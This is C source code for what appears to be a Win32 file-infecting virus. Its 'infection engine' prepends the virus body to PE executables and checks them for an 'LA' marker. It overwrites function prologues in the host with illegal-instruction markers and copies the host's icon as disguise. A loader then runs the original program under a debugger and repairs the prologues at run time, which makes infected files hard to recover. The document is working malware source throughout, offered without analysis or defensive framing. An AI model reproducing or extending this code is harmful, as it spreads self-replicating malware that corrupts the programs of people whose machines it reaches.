#include "winapp32.h"

/******************************************************************************/
/*                                              Procedure checks if PE  is already infected                                             */
/******************************************************************************/
//Declaration
bool Already(char* TargetName)
{
 bool x = false;;
 HANDLE h1 = CreateFile(TargetName,GENERIC_READ, FILE_SHARE_READ |
                                                                FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);;
 if (h1==INVALID_HANDLE_VALUE) {return false;;};;
 DWORD readed;;
 WORD addr = 0;;
 SetFilePointer(h1,0x3C,NULL,FILE_BEGIN);;
 ReadFile(h1,&addr,2,&readed,NULL);;
 SetFilePointer(h1,addr-2,NULL,FILE_BEGIN);;
 char ss[2]="XX";;
 ReadFile(h1,&ss,2,&readed,NULL);;
 if ((readed==2) && (ss[0]=='L') && (ss[1]=='A')) {x=true;;};;
 CloseHandle(h1);;
 return x;;
};


/******************************************************************************/
/*                                                         MAIN INFECTION ENGINE - Win32 PE                                             */
/******************************************************************************/
bool infector_busy = false;
//Declaration
void InfectPE(char* TargetName)
{
 if ((BadImage)||(NoInfect)||(infector_busy)||(VPtr==NULL)) return;;
 char ss[MAX_PATH+666]="Process ";;
 strcat(ss,TargetName);;
 infector_busy=true;;
 char Temp[MAX_PATH];;
 if (!GetTempDir(Temp))
  { infector_busy=false;; return;; };;
 Log(TargetName);;
 if (DetectFileFormat(TargetName)!=FILE_FORMAT_PE)
  { infector_busy=false;; return;; };;
 if (Already(TargetName))
  { infector_busy=false;; return;; };;
 if (!AskBoss(ss))
  { infector_busy=false;; return;; };;
 DWORD NewIcon = FindIcon(TargetName);;
 char buf[COPY_BLOCK_SIZE];;
 HANDLE h1 = CreateFile(TargetName,GENERIC_READ,0,NULL,OPEN_EXISTING,0,NULL);;
 strcat(Temp,"\\TMP$$001.TMP");;
 HANDLE h2 = CreateFile(Temp,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,0,NULL);;
 if ((h1==INVALID_HANDLE_VALUE)||(h2==INVALID_HANDLE_VALUE))
 {
  CloseHandle(h1);;
  CloseHandle(h2);;
  DeleteFile(Temp);;
  infector_busy=false;;
  return;;
 };;
 DWORD readed;;
 if (NewIcon!=0)
 {
  SetFilePointer(h1,NewIcon,NULL,FILE_BEGIN);;
  ReadFile(h1,MyIcon,744,&readed,NULL);;
  SetFilePointer(h1,0,NULL,FILE_BEGIN);;
 }
 else
 { memmove(MyIcon,DefaultIcon,744);; };;
 DWORD written;;
 WriteFile(h2,VPtr,VSize,&written,NULL);;
 WriteFile(h2,SrcPtr,SSize,&written,NULL);;
 do
 {
  ReadFile(h1,&buf,sizeof(buf),&readed,NULL);;
  char* t = buf;;
  for (int i=0; i<(sizeof(buf)-5); i++)
  {
        if ( ((*t)=='\x55')&&((*(t+1))=='\x8B')&&((*(t+2))=='\xEC') )
        {
         (*t) = '\xFF';;
         (*(t+1)) = '\xFF';;
         (*(t+2)) = random(256);;
        };;
        t++;;
  };;
  if (!WriteFile(h2,&buf,readed,&written,NULL))
  {
        CloseHandle(h1);; CloseHandle(h2);;
        DeleteFile(Temp);; infector_busy=false;;
        return;;
  };; // End if
 } while (readed==sizeof(buf));; // End do
 CloseHandle(h1);;
 CloseHandle(h2);;
 DeleteFile(TargetName);;
 if (!MoveFile(Temp,TargetName))
  { DeleteFile(Temp);; infector_busy=false;; return;; };;
 infector_busy=false;;
 sprintf(ss,"Processed - %s",TargetName);
 Log(ss);;
};

/******************************************************************************/
/*                                                               ORIGINAL FILE LOADER                                                                           */
/******************************************************************************/

//Declaration
void LoadCarrier()
{
 VPtr = malloc(VSize);;
 SrcPtr = malloc(SSize);;
 DWORD delta;;
 if ((delta=FindIcon(MyName))==0) return;;
 MyIcon = (void*)(DWORD(VPtr)+delta);;
 HANDLE h1 = CreateFile(MyName,GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,
                                                          OPEN_EXISTING,0,NULL);;
 if (h1==INVALID_HANDLE_VALUE) exit(EXIT_FAILURE);;
 DWORD FileSize = SetFilePointer(h1,0,NULL,FILE_END);;
 SetFilePointer(h1,0,NULL,FILE_BEGIN);;
 if (FileSize<(VSize+SSize)) exit(EXIT_FAILURE);;
 DWORD readed;;
 ReadFile(h1,VPtr,VSize,&readed,NULL);;
 ReadFile(h1,SrcPtr,SSize,&readed,NULL);;
 BadImage = false;;
 if (FileSize==(VSize+SSize)) {CloseHandle(h1);; return;; };;
 char   Drive[MAX_PATH];;
 char   Dir[MAX_PATH];;
 char   Name[MAX_PATH];;
 char   Ext[MAX_PATH];;
 char   TempName[MAX_PATH];;
 fnsplit(MyName,Drive,Dir,Name,Ext);;
 HANDLE h2;;
 int i;;
 for (i=0; i<999; i++)
 {
  char ss[5];;
  sprintf(ss,".%03u",i);;
  strcpy(TempName,Drive);;
  strcat(TempName,Dir);;
  if (!RWDir(TempName))
        if (!GetTempDir(TempName)) return;;
  strcat(TempName,Name);;
  strcat(TempName,ss);;
  h2 = CreateFile(TempName,GENERIC_WRITE,0,NULL,CREATE_NEW,0,NULL);;
  if (h2!=INVALID_HANDLE_VALUE) break;;
 };
 if (h2==INVALID_HANDLE_VALUE)  return;;
 char buf[COPY_BLOCK_SIZE];;
 DWORD written;;
 do
 {
  ReadFile(h1,&buf,sizeof(buf),&readed,NULL);;
  WriteFile(h2,&buf,readed,&written,NULL);;
 } while (readed==sizeof(buf));;
 CloseHandle(h1);;
 CloseHandle(h2);;
 STARTUPINFO SInfo;;
 PROCESS_INFORMATION PInfo;;
 GetStartupInfo(&SInfo);;
 sprintf(buf,"%s%s",Drive,Dir);
 Log(buf);
 if (!CreateProcess(TempName,CommandLine,NULL,NULL,FALSE,
         DEBUG_ONLY_THIS_PROCESS | CREATE_DEFAULT_ERROR_MODE,
         NULL,buf,&SInfo,&PInfo))
 {DeleteFile(TempName);; return;; };;
 BOOL ExceptionHandled = false;;
 BOOL ExceptionOK;;
 DEBUG_EVENT Event;;
 BOOL last;;
 do
 {
        ExceptionOK = true;;
        WaitForDebugEvent(&Event,INFINITE);;
        if (Event.dwProcessId!=PInfo.dwProcessId)
        {
         ContinueDebugEvent(Event.dwProcessId,Event.dwThreadId,DBG_EXCEPTION_NOT_HANDLED);;
         continue;;
        };;
        ExceptionOK = true;;
        last = (Event.dwDebugEventCode == EXIT_PROCESS_DEBUG_EVENT);;
        if (Event.dwDebugEventCode == EXCEPTION_DEBUG_EVENT)
        { // Handle exception :E
         ExceptionOK = false;;
         if ((Event.u.Exception.ExceptionRecord.ExceptionCode==EXCEPTION_ILLEGAL_INSTRUCTION)&&
                (Event.u.Exception.ExceptionRecord.ExceptionFlags!=EXCEPTION_NONCONTINUABLE))
         {
          WORD Glitch = 0;;
          DWORD readed = 0;;
          ReadProcessMemory(PInfo.hProcess,Event.u.Exception.ExceptionRecord
                                                                                .ExceptionAddress,&Glitch,2,&readed);;
          if (Glitch == 0xFFFF)
          {
                char SHIT[3]="\x55\x8B\xEC";;
                DWORD written = 0;;
                WriteProcessMemory(PInfo.hProcess,
                 Event.u.Exception.ExceptionRecord.ExceptionAddress,&SHIT,3,&written);;
                ExceptionHandled = true;;
                ExceptionOK = (written==3);;
          };;
         };;
        };; // EXCEPTION_DEBUG_EVENT
 if (ExceptionHandled)
  ContinueDebugEvent(Event.dwProcessId,Event.dwThreadId,DBG_CONTINUE);;
 else
  {
   ContinueDebugEvent(Event.dwProcessId,Event.dwThreadId,DBG_EXCEPTION_NOT_HANDLED);;
   Log("Exception not handled");;
  };
 }
 while (!last);;
 DWORD TStatus;;
 do
  { GetExitCodeProcess(PInfo.hProcess,&TStatus);; }
 while (TStatus==STILL_ACTIVE);;
 if (ExceptionHandled) Log("There were exceptions handled in this process");;
 for (i=0; i<13; i++)
 {
  Sleep(1000);;
  if (DeleteFile(TempName)) break;;
 };;
 Log("File deleted");
}

/******************************************************************************/
/*                                                               FILE FORMAT DETECTION                                                                  */
/******************************************************************************/

//Declaration
int DetectFileFormat(char* TargetName)
{
 int    x = FILE_FORMAT_UNRECOGNIZED;;
 unsigned char header[0x100];;
 DWORD readed;;
 HANDLE h = CreateFile(TargetName,GENERIC_READ, FILE_SHARE_READ |
  FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);;
 if (h==INVALID_HANDLE_VALUE) return x;;
 ReadFile(h,&header,sizeof(header),&readed,NULL);;
 if (readed!=sizeof(header)) { CloseHandle(h); return x;; };;
 WORD w = *((WORD*)header);
 if (w!=0x5A4D) return x;;
 x=FILE_FORMAT_MZ;;
 UINT jaddr = (header[0x3C]+header[0x3D]*0x100);;
 SetFilePointer(h,jaddr,NULL,FILE_BEGIN);;
 ReadFile(h,&header,sizeof(header),&readed,NULL);;
 if (readed!=sizeof(header)) { CloseHandle(h);; return x;; };;
 w = *((WORD*)header);
 switch (w)
 {
  case 0x454E : x = FILE_FORMAT_NE;; break;
  case 0x4550 : x = FILE_FORMAT_PE;; break;
  case 0x454C : x = FILE_FORMAT_LE;; break;
  case 0x584C : x = FILE_FORMAT_LX;; break;
 };;
 CloseHandle(h);;
 return x;;
}

/******************************************************************************/
/*                                                               RESOURCE PROCESSING                                                                    */
/******************************************************************************/
DWORD located_addr;
bool  TypeIcon;
DWORD delta;

//Declaration
LPVOID GetSectionPtr(PSTR name, PIMAGE_NT_HEADERS pNTHeader, DWORD imageBase)
{
 PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(pNTHeader);;
 for (unsigned i=0; i<pNTHeader->FileHeader.NumberOfSections; i++,section++)
 {
  if (strnicmp(section->Name,name,IMAGE_SIZEOF_SHORT_NAME)==0)
  {
        delta = section->PointerToRawData - section->VirtualAddress;;
        return (LPVOID)(section->PointerToRawData + imageBase);;
  };
 };
 return 0;;
};

void DumpResourceDirectory (PIMAGE_RESOURCE_DIRECTORY resDir,
                        DWORD resourceBase, DWORD level, DWORD resourceType);

//Declaration
void DumpResourceEntry( MY_PIMAGE_RESOURCE_DIRECTORY_ENTRY resDirEntry,
                                                                DWORD resourceBase, DWORD level)
{
 UINT i;;
 char nameBuffer[128];;
 PIMAGE_RESOURCE_DATA_ENTRY pResDataEntry;;
 if ( (resDirEntry->u2.OffsetToData) & IMAGE_RESOURCE_DATA_IS_DIRECTORY )
 {
  DumpResourceDirectory( (PIMAGE_RESOURCE_DIRECTORY)
        ((resDirEntry->u2.OffsetToData & 0x7FFFFFFF) + resourceBase),
                resourceBase, level, resDirEntry->u.Name);;
  return;;
 };;
 pResDataEntry = (PIMAGE_RESOURCE_DATA_ENTRY)
                                          (resourceBase + resDirEntry->u2.OffsetToData);;
 if (TypeIcon&&(located_addr==0)&&(pResDataEntry->Size==744))
  located_addr=pResDataEntry->OffsetToData+delta;;
};;
//Declaration
void DumpResourceDirectory(PIMAGE_RESOURCE_DIRECTORY resDir,DWORD resourceBase,
                                                                        DWORD level, DWORD resourceType)
{
 MY_PIMAGE_RESOURCE_DIRECTORY_ENTRY resDirEntry;;
 UINT i;;
 TypeIcon = (resourceType==1)||(resourceType==3);;
  resDirEntry = (MY_PIMAGE_RESOURCE_DIRECTORY_ENTRY)(resDir+1);;
 for ( i=0; i < resDir->NumberOfNamedEntries; i++, resDirEntry++ )
  DumpResourceEntry(resDirEntry, resourceBase, level+1);;
 for ( i=0; i < resDir->NumberOfIdEntries; i++, resDirEntry++ )
  DumpResourceEntry(resDirEntry, resourceBase, level+1);;
};;

//Declaration
void DumpResourceSection(DWORD base, PIMAGE_NT_HEADERS pNTHeader)
{
 PIMAGE_RESOURCE_DIRECTORY resDir;;
 resDir = (PIMAGE_RESOURCE_DIRECTORY) GetSectionPtr(".rsrc", pNTHeader, (DWORD)base);;
 if ( !resDir ) return;;
 DumpResourceDirectory(resDir,(DWORD)resDir,0,0);;
};
//Declaration
DWORD FindIcon(char* TargetName)
{
 located_addr = 0;;
 PIMAGE_DOS_HEADER dosHeader;;
 HANDLE hFile = CreateFile(TargetName,GENERIC_READ, FILE_SHARE_READ,NULL,
                                                  OPEN_EXISTING,0,NULL);;
 if ( hFile == INVALID_HANDLE_VALUE ) return 0;;
 HANDLE hFileMapping = CreateFileMapping(hFile,NULL,PAGE_READONLY,0,0,NULL);;
 if ( hFileMapping == 0 ) {CloseHandle(hFile);; return 0;; };;
 LPVOID lpFileBase = MapViewOfFile(hFileMapping,FILE_MAP_READ,0,0,0);;
 if ( lpFileBase == 0 )
  {CloseHandle(hFileMapping);; CloseHandle(hFile);; return 0;; };;
 if ((*((WORD*)lpFileBase))!=0x5A4D)
  {
        UnmapViewOfFile(lpFileBase);; CloseHandle(hFileMapping);;
        CloseHandle(hFile);; return 0;;
  };;
 PIMAGE_NT_HEADERS pNTHeader;;
 DWORD base = (DWORD)lpFileBase;;
 WORD hru = *((WORD*)((DWORD)(lpFileBase)+0x3C));;
 pNTHeader  = (PIMAGE_NT_HEADERS)(DWORD(lpFileBase)+hru);;

 DumpResourceSection(base,pNTHeader);;

 UnmapViewOfFile(lpFileBase);;
 CloseHandle(hFileMapping);;
 CloseHandle(hFile);;
 return located_addr;;
}
